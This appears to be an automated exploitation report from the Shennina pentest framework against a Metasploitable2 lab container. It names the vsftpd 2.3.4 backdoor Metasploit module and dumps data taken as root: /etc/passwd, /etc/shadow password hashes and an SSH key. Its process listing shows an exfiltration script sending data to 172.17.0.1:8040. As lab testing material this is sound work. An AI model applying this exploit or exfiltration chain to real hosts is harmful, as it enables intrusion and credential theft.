
# Shennina Exploitation Report

## Target: `172.17.0.3`

#### The target has been compromised using the following:


## Exploit: `exploit/unix/ftp/vsftpd_234_backdoor`

## Exploit Details

### Name

```
VSFTPD v2.3.4 Backdoor Command Execution
```

### Description

```
This module exploits a malicious backdoor that was added to the VSFTPD download archive. This backdoor was introduced into the vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 according to the most recent information available. This backdoor was removed on July 3rd 2011.
```

### References

```
OSVDB-73573
http://pastebin.com/AetT9sS5
http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
```

## Shell Type: `shell`

## Payload: `payload/cmd/unix/interact`



---

# Data Obtained From Target via Exfiltration Server
### files_etc_passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
snmp:x:115:65534::/var/lib/snmp:/bin/false

```

### files_etc_shadow

```
root:$1$/avpfBJ1$x0z8w5UF9Iv./DR9E9Lid.:14747:0:99999:7:::
daemon:*:14684:0:99999:7:::
bin:*:14684:0:99999:7:::
sys:$1$fUX6BPOt$Miyc3UpOzQJqz4s5wFD9l0:14742:0:99999:7:::
sync:*:14684:0:99999:7:::
games:*:14684:0:99999:7:::
man:*:14684:0:99999:7:::
lp:*:14684:0:99999:7:::
mail:*:14684:0:99999:7:::
news:*:14684:0:99999:7:::
uucp:*:14684:0:99999:7:::
proxy:*:14684:0:99999:7:::
www-data:*:14684:0:99999:7:::
backup:*:14684:0:99999:7:::
list:*:14684:0:99999:7:::
irc:*:14684:0:99999:7:::
gnats:*:14684:0:99999:7:::
nobody:*:14684:0:99999:7:::
libuuid:!:14684:0:99999:7:::
dhcp:*:14684:0:99999:7:::
syslog:*:14684:0:99999:7:::
klog:$1$f2ZVMS4K$R9XkI.CmLdHhdUE3X9jqP0:14742:0:99999:7:::
sshd:*:14684:0:99999:7:::
msfadmin:$1$XN10Zj2c$Rt/zzCW3mLtUWA.ihZjA5/:14684:0:99999:7:::
bind:*:14685:0:99999:7:::
postfix:*:14685:0:99999:7:::
ftp:*:14685:0:99999:7:::
postgres:$1$Rw35ik.x$MgQgZUuO5pAoUvfJhfcYe/:14685:0:99999:7:::
mysql:!:14685:0:99999:7:::
tomcat55:*:14691:0:99999:7:::
distccd:*:14698:0:99999:7:::
user:$1$HESu9xrH$k.o3G93DGoXIiQKkPmUgZ0:14699:0:99999:7:::
service:$1$kR3ue7JZ$7GxELDupr5Ohp6cjZ3Bu//:14715:0:99999:7:::
telnetd:*:14715:0:99999:7:::
proftpd:!:14727:0:99999:7:::
statd:*:15474:0:99999:7:::
snmp:*:15480:0:99999:7:::

```

### files_etc_issue

```
                _                  _       _ _        _     _      ____  
 _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                            |_|                                          


Warning: Never expose this VM to an untrusted network!

Contact: msfdev[at]metasploit.com

Login with msfadmin/msfadmin to get started



```

### home_ssh_authorized_keys

```
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable

```

### bashrc

```
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
[ -z "$PS1" ] && return

# don't put duplicate lines in the history. See bash(1) for more options
#export HISTCONTROL=ignoredups

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "$debian_chroot" -a -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
xterm-color)
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
    ;;
*)
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
    ;;
esac

# Comment in the above and uncomment this below for a color prompt
#PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PROMPT_COMMAND='echo -ne "\033]0;${USER}@${HOSTNAME}: ${PWD/$HOME/~}\007"'
    ;;
*)
    ;;
esac

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

#if [ -f ~/.bash_aliases ]; then
#    . ~/.bash_aliases
#fi

# enable color support of ls and also add handy aliases
if [ "$TERM" != "dumb" ]; then
    eval "`dircolors -b`"
    alias ls='ls --color=auto'
    #alias dir='ls --color=auto --format=vertical'
    #alias vdir='ls --color=auto --format=long'
fi

# some more ls aliases
#alias ll='ls -l'
#alias la='ls -A'
#alias l='ls -CF'

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
#if [ -f /etc/bash_completion ]; then
#    . /etc/bash_completion
#fi

```

### ifconfig

```
eth0      Link encap:Ethernet  HWaddr 02:42:ac:11:00:03  
          inet addr:172.17.0.3  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:222 errors:0 dropped:0 overruns:0 frame:0
          TX packets:177 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:1012374 (988.6 KB)  TX bytes:16952 (16.5 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:39 errors:0 dropped:0 overruns:0 frame:0
          TX packets:39 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:17017 (16.6 KB)  TX bytes:17017 (16.6 KB)


```

### uname

```
Linux metasploitable2 5.4.0-113-generic #127-Ubuntu SMP Wed May 18 14:30:56 UTC 2022 x86_64 GNU/Linux

```

### id_command

```
uid=0(root) gid=0(root)

```

### user

```
root

```

### ps_aux

```
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.1  0.0   2780  2232 pts/0    Ss   08:44   0:00 sh -c /bin/services.sh && bash
daemon        70  0.0  0.0   2044  1148 ?        Ss   08:44   0:00 /usr/sbin/atd
root         101  0.0  0.0   2164  1768 ?        Ss   08:44   0:00 /usr/sbin/cron
daemon       124  0.0  0.0   2376  1224 ?        SNs  08:44   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon       125  0.0  0.0   2376   116 ?        SN   08:44   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
root         178  0.0  0.0   2828  2260 pts/0    S    08:44   0:00 /bin/sh /usr/bin/mysqld_safe
mysql        220  0.6  0.1 135808 20016 pts/0    Sl   08:44   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --port=3306 --socket=/var/run/mysqld/mysqld.sock
root         221  0.0  0.0   1760  1224 pts/0    S    08:44   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
daemon       232  0.0  0.0   2376   116 ?        SN   08:44   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon       409  0.0  0.0   5996  1152 ?        Ss   08:44   0:00 /sbin/portmap
daemon       413  0.0  0.0   2376   116 ?        SN   08:44   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
root         496  0.0  0.0   5472  3096 ?        Ss   08:44   0:00 /usr/lib/postfix/master
postfix      502  0.0  0.0   5480  3068 ?        S    08:44   0:00 pickup -l -t fifo -u -c
postfix      503  0.0  0.0   5520  3128 ?        S    08:44   0:00 qmgr -l -t fifo -u
postgres     540  1.2  0.0  41400  9264 ?        S    08:44   0:00 /usr/lib/postgresql/8.3/bin/postgres -D /var/lib/postgresql/8.3/main -c config_file=/etc/postgresql/8.3/main/postgresql.conf
daemon       541  0.0  0.0   2376   116 ?        SN   08:44   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon       544  0.0  0.0   2376   116 ?        SN   08:44   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
postgres     545  0.0  0.0  41400  2664 ?        Ss   08:45   0:00 postgres: writer process                                                                                                    
postgres     546  0.0  0.0  41400  2600 ?        Ss   08:45   0:00 postgres: wal writer process                                                                                                
postgres     547  0.0  0.0  41400  3868 ?        Ss   08:45   0:00 postgres: autovacuum launcher process                                                                                       
postgres     548  0.0  0.0  12720  3404 ?        Ss   08:45   0:00 postgres: stats collector process                                                                                           
daemon       552  0.0  0.0   2376   116 ?        SN   08:45   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon       553  0.0  0.0   2376   116 ?        SN   08:45   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon       557  0.0  0.0   2376   116 ?        SN   08:45   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
proftpd      595  0.0  0.0  10008  2712 ?        Ss   08:45   0:00 proftpd: (accepting connections)
root         656  0.0  0.0   5448  2500 ?        Ss   08:45   0:00 /usr/sbin/nmbd -D
root         658  0.0  0.0   7784  3516 ?        Ss   08:45   0:00 /usr/sbin/smbd -D
root         680  0.0  0.0   7784   560 ?        S    08:45   0:00 /usr/sbin/smbd -D
daemon       681  0.0  0.0   2376   116 ?        SN   08:45   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
snmp         684  0.0  0.0   8676  6012 ?        S    08:45   0:00 /usr/sbin/snmpd -Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 127.0.0.1
root         716  0.0  0.0   5372  3020 ?        Ss   08:45   0:00 /usr/sbin/sshd
syslog       766  1.5  0.0   6096  5652 ?        Ss   08:45   0:00 /sbin/syslogd -u syslog
daemon       767  0.0  0.0   2376   116 ?        SN   08:45   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
root         809  0.0  0.0   2112   124 ?        Ss   08:45   0:00 /usr/bin/jsvc -user tomcat55 -cp /usr/share/java/commons-daemon.jar:/usr/share/tomcat5.5/bin/bootstrap.jar -outfile SYSLOG -errfile SYSLOG -pidfile /var/run/tomcat5.5.pid -Djava.awt.headless=true -Xmx128M -Djava.endorsed.dirs=/usr/share/tomcat5.5/common/endorsed -Dcatalina.base=/var/lib/tomcat5.5 -Dcatalina.home=/usr/share/tomcat5.5 -Djava.io.tmpdir=/var/lib/tomcat5.5/temp -Djava.security.manager -Djava.security.policy=/var/lib/tomcat5.5/conf/catalina.policy org.apache.catalina.startup.Bootstrap
root         810  0.0  0.0   2112  1264 ?        S    08:45   0:00 /usr/bin/jsvc -user tomcat55 -cp /usr/share/java/commons-daemon.jar:/usr/share/tomcat5.5/bin/bootstrap.jar -outfile SYSLOG -errfile SYSLOG -pidfile /var/run/tomcat5.5.pid -Djava.awt.headless=true -Xmx128M -Djava.endorsed.dirs=/usr/share/tomcat5.5/common/endorsed -Dcatalina.base=/var/lib/tomcat5.5 -Dcatalina.home=/usr/share/tomcat5.5 -Djava.io.tmpdir=/var/lib/tomcat5.5/temp -Djava.security.manager -Djava.security.policy=/var/lib/tomcat5.5/conf/catalina.policy org.apache.catalina.startup.Bootstrap
tomcat55     811 23.8  0.5 365208 91468 ?        Sl   08:45   0:15 /usr/bin/jsvc -user tomcat55 -cp /usr/share/java/commons-daemon.jar:/usr/share/tomcat5.5/bin/bootstrap.jar -outfile SYSLOG -errfile SYSLOG -pidfile /var/run/tomcat5.5.pid -Djava.awt.headless=true -Xmx128M -Djava.endorsed.dirs=/usr/share/tomcat5.5/common/endorsed -Dcatalina.base=/var/lib/tomcat5.5 -Dcatalina.home=/usr/share/tomcat5.5 -Djava.io.tmpdir=/var/lib/tomcat5.5/temp -Djava.security.manager -Djava.security.policy=/var/lib/tomcat5.5/conf/catalina.policy org.apache.catalina.startup.Bootstrap
root         923  0.1  0.1  66404 30640 pts/0    Sl   08:45   0:00 /usr/bin/rmiregistry
root         927  0.3  0.0  12268  3376 pts/0    Sl   08:45   0:00 ruby /usr/sbin/druby_timeserver.rb
root         930  0.0  0.0   2896  2328 pts/0    S+   08:45   0:00 bash
root         948  0.4  0.0  13988 13292 pts/0    S    08:45   0:00 Xtightvnc :0 -desktop X -auth /root/.Xauthority -geometry 1024x768 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5900 -fp /usr/X11R6/lib/X11/fonts/Type1/,/usr/X11R6/lib/X11/fonts/Speedo/,/usr/X11R6/lib/X11/fonts/misc/,/usr/X11R6/lib/X11/fonts/75dpi/,/usr/X11R6/lib/X11/fonts/100dpi/,/usr/share/fonts/X11/misc/,/usr/share/fonts/X11/Type1/,/usr/share/fonts/X11/75dpi/,/usr/share/fonts/X11/100dpi/ -co /etc/X11/rgb
root         953  0.0  0.0   8600  3216 pts/0    S    08:45   0:00 /usr/bin/unrealircd
root         954  0.0  0.0   2484  1780 ?        Ss   08:45   0:00 /usr/sbin/xinetd -pidfile /var/run/xinetd.pid -stayalive -inetd_compat
root         958  0.0  0.0   2784  2224 pts/0    S    08:45   0:00 /bin/sh /root/.vnc/xstartup
root         961  0.0  0.0   5996  4380 pts/0    S    08:45   0:00 xterm -geometry 80x24+10+10 -ls -title X Desktop
root         963  0.6  0.0   9048  7512 pts/0    S    08:45   0:00 fluxbox
root         998  0.0  0.0   2904  2384 pts/1    Ss+  08:45   0:00 -bash
root        1045  0.0  0.0   2796  2256 ?        SNs  08:45   0:00 sh
nobody      1046  0.0  0.0   2256  1352 ?        SN   08:45   0:00 vsftpd
root        1055  0.0  0.0   1148   788 ?        SN   08:45   0:00 /tmp/mFnhF
root        1062  0.0  0.0   2788  2228 ?        SN   08:46   0:00 sh /dev/stdin 172.17.0.1:8040 f4b69a7d-19eb-4055-bcdd-f3da5f2aaa00
root        1063  0.0  0.0   2884  1776 ?        SN   08:46   0:00 sh /dev/stdin 172.17.0.1:8040 f4b69a7d-19eb-4055-bcdd-f3da5f2aaa00
root        1105  0.0  0.0   2884  1496 ?        SN   08:46   0:00 sh /dev/stdin 172.17.0.1:8040 f4b69a7d-19eb-4055-bcdd-f3da5f2aaa00
root        1106  0.0  0.0   2424  1560 ?        RN   08:46   0:00 ps aux
root        1107  0.0  0.0   2884  1712 ?        SN   08:46   0:00 sh /dev/stdin 172.17.0.1:8040 f4b69a7d-19eb-4055-bcdd-f3da5f2aaa00
root        1108  0.0  0.0   1768   292 ?        SN   08:46   0:00 xxd -ps /dev/stdin
root        1109  0.0  0.0   1796   328 ?        SN   08:46   0:00 tr -d ?

```

